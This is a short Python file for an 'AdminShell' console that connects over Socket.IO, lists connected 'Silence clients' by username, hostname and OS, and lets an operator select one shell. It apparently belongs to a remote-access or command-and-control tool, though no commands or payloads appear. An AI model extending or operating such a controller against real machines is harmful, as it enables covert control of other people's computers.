import socketio
import time
import os
from rich.console import Console
from rich.table import Table


class AdminShell:
    def __init__(self, host):
        self.host = host
        self.sio_client = socketio.Client()
        self.condition_responded = False
        self.clients = None
        self.current_shell = None
        self.console = Console()

    def run(self):
        self.sio_client.connect(self.host)
        self.sio_client.emit("get_data", callback=self.on_data)
        self.set_current_shell()
        print(self.clients[self.current_shell])

    def set_current_shell(self):
        self.sync_responded()
        self.print_shell_options()
        self.console.print("[bold cyan]>>[/bold cyan] ", end="")
        self.current_shell = int(input("")) - 1

        if self.current_shell >= len(self.clients) or self.current_shell < 0:
            self.print_error_msg("Invalid shell")
            time.sleep(2)
            self.console.clear()
            self.set_current_shell()

    def print_error_msg(self, msg):
        self.console.print(f"[bold red]{msg}[/bold red]")

    def print_shell_options(self):
        client_table = Table(title="Silence clients")

        client_table.add_column("ID", justify="right", style="cyan", no_wrap=True)
        client_table.add_column("Username", justify="right", style="cyan", no_wrap=True)
        client_table.add_column("Hostname", style="magenta")
        client_table.add_column("OS", justify="left", style="green")

        for index, client in enumerate(self.clients):
            client_table.add_row(str(index + 1), client["username"], client["hostname"], client["os"])

        self.console.print(client_table)

    def sync_responded(self):
        while not self.condition_responded:
            time.sleep(0.3)

    def on_data(self, data):
        self.clients = data
        self.condition_responded = True
